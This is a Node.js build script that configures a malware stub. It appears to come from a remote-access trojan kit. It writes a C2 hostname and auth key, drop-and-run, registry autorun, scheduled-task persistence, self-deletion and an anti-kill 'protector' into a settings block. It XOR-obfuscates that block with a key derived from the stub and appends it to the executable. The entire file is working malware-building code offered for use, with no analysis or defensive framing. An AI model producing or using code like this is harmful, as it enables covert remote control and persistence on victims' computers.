#!/usr/bin/env node
// build-stub.js — replaces Builder.exe for MinGW-compiled Stub.exe
// Usage: node build-stub.js <stub_in> <stub_out> <c2_host> <auth_key> [options]
//
// Options (all optional):
//   --delay <ms>          poll interval in ms  (default: 5000)
//   --drop <path>         drop path
//   --drop-run            enable drop+run
//   --autorun <regname>   autorun registry value name
//   --scheduler <name>    scheduler task name
//   --auto-delete         delete original after drop
//   --protector           enable anti-kill protector
//   --protector-name <p>  protector binary path

'use strict';
const crypto = require('crypto');
const fs     = require('fs');

// ── Settings struct layout (must match MinGW g++ layout of Builder::Settings) ──
// All fields are 1-byte aligned (only chars and bools), so sizeof = 643 bytes.
const STRUCT = {
    botapi:         { off:   0, len: 128 },  // AES-encrypted C2 hostname
    key:            { off: 128, len:  16 },  // raw AES-128 key
    chatid:         { off: 144, len: 128 },  // auth key (plain)
    drop:           { off: 272, len: 128 },  // drop path
    drop_run:       { off: 400, len:   1 },  // bool
    scheduler_name: { off: 401, len:  50 },
    scheduler_state:{ off: 451, len:   1 },
    autorun:        { off: 452, len: 128 },
    autorun_state:  { off: 580, len:   1 },
    client_delay:   { off: 581, len:  10 },  // decimal ms as string
    auto_delete:    { off: 591, len:   1 },
    protector:      { off: 592, len:   1 },
    protectorName:  { off: 593, len:  50 },
};
const SETTINGS_SIZE = 643;
const MAGIC = Buffer.from([0xB4, 0x4B, 0xD4, 0x3E, 0x7A, 0x91, 0xC3, 0xF8]);

function putStr(buf, field, str) {
    const { off, len } = STRUCT[field];
    buf.fill(0, off, off + len);
    if (str) buf.write(str.slice(0, len - 1), off, 'binary');
}

function putBool(buf, field, val) {
    buf[STRUCT[field].off] = val ? 1 : 0;
}

// AES-128-CBC encrypt, prepend IV — matches CryptoPP::CBC_Mode EncryptStr
function aesEncrypt(plaintext, key16) {
    const iv  = crypto.randomBytes(16);
    const padLen = 16 - (plaintext.length % 16);  // PKCS7
    const padded = Buffer.concat([plaintext, Buffer.alloc(padLen, padLen)]);
    const cipher = crypto.createCipheriv('aes-128-cbc', key16, iv);
    cipher.setAutoPadding(false);
    const ct = Buffer.concat([cipher.update(padded), cipher.final()]);
    return Buffer.concat([iv, ct]);
}

// XOR key derived from first 1024 bytes of stub — matches DeriveXorKey in Builder.cpp
function deriveXorKey(stubBuf) {
    const key = Buffer.alloc(8, 0);
    const n   = Math.min(stubBuf.length, 1024);
    for (let i = 0; i < n; i++) {
        let b = key[i % 8] ^ stubBuf[i];
        b = ((b << 3) | (b >> 5)) & 0xFF;   // rotate-left-3
        key[i % 8] = b;
    }
    return key;
}

function xorConfig(buf, xorKey) {
    for (let i = 0; i < buf.length; i++)
        buf[i] ^= xorKey[i % 8];
}

// ── CLI ──────────────────────────────────────────────────────────────────────

const args = process.argv.slice(2);
if (args.length < 4) {
    console.error('Usage: node build-stub.js <Stub.exe> <output.exe> <c2_host> <auth_key> [options]');
    console.error('  c2_host  : hostname or IP of your C2 server (e.g. 192.168.1.10)');
    console.error('  auth_key : value of C2_AUTH env var on your server (default: changeme)');
    process.exit(1);
}

const [stubPath, outPath, c2Host, authKey] = args;
const opts = {};
for (let i = 4; i < args.length; i++) {
    switch (args[i]) {
        case '--delay':          opts.delay        = args[++i]; break;
        case '--drop':           opts.drop         = args[++i]; break;
        case '--drop-run':       opts.dropRun      = true;      break;
        case '--autorun':        opts.autorun      = args[++i]; break;
        case '--scheduler':      opts.scheduler    = args[++i]; break;
        case '--auto-delete':    opts.autoDelete   = true;      break;
        case '--protector':      opts.protector    = true;      break;
        case '--protector-name': opts.protectorName= args[++i]; break;
    }
}

// Read Stub binary
if (!fs.existsSync(stubPath)) { console.error('Stub not found:', stubPath); process.exit(1); }
const stubBuf = fs.readFileSync(stubPath);

// Build Settings buffer
const settings = Buffer.alloc(SETTINGS_SIZE, 0);

// Store hostname as plain null-terminated string in botapi
// (WinMain no longer calls DecryptStr; XOR of the whole Settings block provides obfuscation)
const hostBuf = Buffer.from(c2Host, 'binary');
if (hostBuf.length > 126) { console.error('c2_host too long (max 126 chars)'); process.exit(1); }
hostBuf.copy(settings, STRUCT.botapi.off);

putStr(settings,  'chatid',         authKey);
putStr(settings,  'drop',           opts.drop || '');
putBool(settings, 'drop_run',       !!opts.dropRun);
putStr(settings,  'scheduler_name', opts.scheduler || '');
putBool(settings, 'scheduler_state',!!opts.scheduler);
putStr(settings,  'autorun',        opts.autorun || '');
putBool(settings, 'autorun_state',  !!opts.autorun);
putStr(settings,  'client_delay',   opts.delay || '5000');
putBool(settings, 'auto_delete',    !!opts.autoDelete);
putBool(settings, 'protector',      !!opts.protector);
putStr(settings,  'protectorName',  opts.protectorName || '');

// XOR-encrypt with key derived from stub
const xorKey = deriveXorKey(stubBuf);
xorConfig(settings, xorKey);

// Write output: stub + magic + encrypted settings
const out = Buffer.concat([stubBuf, MAGIC, settings]);
fs.writeFileSync(outPath, out);

console.log('Built:', outPath);
console.log('  C2 host :', c2Host);
console.log('  Auth key:', authKey);
console.log('  Delay   :', opts.delay || '5000', 'ms');
console.log('  Size    :', out.length, 'bytes');
